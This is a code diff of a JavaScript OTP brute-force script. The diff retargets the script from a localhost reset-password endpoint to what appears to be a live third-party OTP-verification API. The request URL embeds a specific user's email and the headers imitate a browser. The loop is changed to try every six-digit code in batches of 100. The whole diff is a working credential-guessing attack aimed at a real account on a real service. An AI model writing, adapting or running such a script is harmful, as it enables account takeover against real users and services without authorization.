@@ -21,13 +21,28 @@ function attackNow({ email, otp, newPassword }) {
             newPassword
         });
         let config = {
-            method: 'post',
+            method: 'get',
             maxBodyLength: Infinity,
-            url: 'http://localhost:3000/reset-password',
+            url: `https://harkiratapi.classx.co.in/get/otpverify?useremail=sahiltiwaskar2003%40gmail.com&otp=${otp}`,
             headers: {
-                'Content-Type': 'application/json'
-            },
-            data: data
+                'accept': '*/*',
+                'accept-language': 'en-GB,en;q=0.8',
+                'auth-key': 'appxapi',
+                'client-service': 'Appx',
+                'device-type': '',
+                'origin': 'https://harkirat.classx.co.in',
+                'priority': 'u=1, i',
+                'referer': 'https://harkirat.classx.co.in/',
+                'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Brave";v="126"',
+                'sec-ch-ua-mobile': '?1',
+                'sec-ch-ua-platform': '"Android"',
+                'sec-fetch-dest': 'empty',
+                'sec-fetch-mode': 'cors',
+                'sec-fetch-site': 'same-site',
+                'sec-gpc': '1',
+                'source': 'website',
+                'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36'
+            }
         };
         try {
             yield axios_1.default.request(config);
@@ -42,12 +57,16 @@ function attackNow({ email, otp, newPassword }) {
 }
 function main() {
     return __awaiter(this, void 0, void 0, function* () {
-        for (let i = 463500; i < 1000000; i++) {
-            yield attackNow({
-                email: "sahil@gmail.com",
-                otp: (i).toString(),
-                newPassword: "Newpassword"
-            });
+        for (let i = 0; i < 999999; i += 100) {
+            let p = [];
+            for (let j = 0; j < 100; j++) {
+                p.push(yield attackNow({
+                    email: "sahil@gmail.com",
+                    otp: (i + j).toString(),
+                    newPassword: "Newpassword"
+                }));
+            }
+            yield Promise.all(p);
         }
     });
 }
